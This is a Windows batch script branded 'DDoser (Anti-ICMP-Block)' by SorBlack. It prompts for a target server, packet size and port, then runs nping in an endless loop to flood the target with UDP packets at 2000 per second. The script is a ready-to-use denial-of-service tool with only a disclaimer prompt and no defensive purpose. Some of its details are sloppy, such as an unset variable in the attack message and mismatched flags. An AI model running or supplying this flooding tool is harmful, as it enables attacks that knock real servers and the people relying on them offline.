@echo off 

mode 80,20
 
title DDoser(new) By SorBlack 
 
color 0a 
 
cls 


echo                        SorBlack - DDoser (Anti-ICMP-Block)
echo                       ------------------------------------
echo                                  Version : 1.0
echo                       ------------------------------------
echo                         !Please Turn Off Notify Windows !
echo                       ------------------------------------
echo                           More : ---------------------                                                                         


echo.

:Menu
set /p U=-- You are confident of your work and will not be responsible for us __Y-n__:

IF %U%==n goto Exit
IF %U%==y goto A
Goto Menu

:Exit
Exit
Goto Exit

cls 

echo.
:A

cls

set /p x=-- server-Target: 

cls
 
echo. 

nping %x% 
 
@nping.exe 127.0.0.1 -n 5 -w 100 
 
Goto Next
:Next 
 
echo. 

cls

 
set /p s=-- size hamle:
 
echo. 

set /p p=-- port hamle: 

echo.

cls
 
:DDOS 
 
color 0c 

echo Attacking Server %m% 


 
nping --udp -p 80 --flags rst --ttl 2 %x% -count 0 --dest-port %p% --data-length %s% --rate 2000 

 
goto DDOS  